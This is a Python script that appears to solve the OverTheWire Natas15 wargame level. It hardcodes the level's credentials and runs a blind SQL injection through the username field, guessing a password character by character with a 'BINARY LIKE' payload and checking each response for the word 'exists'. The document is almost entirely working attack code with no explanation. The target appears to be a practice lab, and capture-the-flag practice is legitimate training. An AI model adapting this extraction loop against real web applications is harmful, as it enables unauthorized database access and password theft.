import requests

username="natas15"
password="GB6USCJYJjwLyYhZUNkE1NwDueiTow6g"
website="http://natas15.natas.labs.overthewire.org/"
charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
extracted_password=""

print("Starting password extraction for natas16...")
for position in range(1, 33):
    for char in charset:
        payload = f'natas16" AND BINARY password LIKE "{extracted_password}{char}%'
        
        data = {'username': payload}
        
        response = requests.post(website, auth=(username, password), data=data)
        
        if "exists" in response.text:
            extracted_password += char
            print(f"Password so far: {extracted_password}")
            break

print(f"\nFinal Natas16 Password: {extracted_password}")
auth=("natas15", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")
